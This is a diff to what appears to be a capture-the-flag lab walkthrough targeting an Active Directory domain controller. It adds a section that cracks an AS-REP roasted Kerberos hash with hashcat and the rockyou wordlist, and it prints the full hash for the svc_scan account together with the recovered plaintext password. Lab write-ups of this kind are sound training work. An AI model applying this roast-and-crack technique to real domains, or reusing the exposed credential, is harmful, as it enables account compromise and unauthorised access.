@@ -161,5 +161,12 @@ LDAP        10.129.11.5     389    BRUNODC          $krb5asrep$23$svc_scan@BRUNO
 I managed to dump the hash of the referenced user
 
 ## Cracking the hash
+```python
+hashcat asrep.hash /usr/share/wordlists/rockyou.txt
+
+$krb5asrep$23$svc_scan@BRUNO.VL:4a533e557cec89a10844e77f1dd508bb$40614fda7d2d66b1e163050ddfa2a36f0b8a39077baa596a041a8c2df650e477d292a9d9d04984e5aeb5a8914e2e1c0c6117050e30bf92df6d33b54fced24c2bbed593184afc3654895b2572b3025455729e42fb221337db0b23c98e0e71c0e7cd12b5b3ac0d9c5da4df1fc11cf955b182aad172179f6573ace8a44ea720894906e55dbcf2f339aae6b3ea92e078f56ef047e00dde9861dbad943a9e552eb02fb0fbddcd691a47a0dfddf9b8a67e9a41a9406b1c5d380dd8de45659f728e9d0f27353b5224338f2fed306cdef2c13efb7d9d112a35f1d6fb7fd8b0be69f8e7befc81ce0c:Sunshine1
+```
+The hash cracked!
+
 ```
 ```
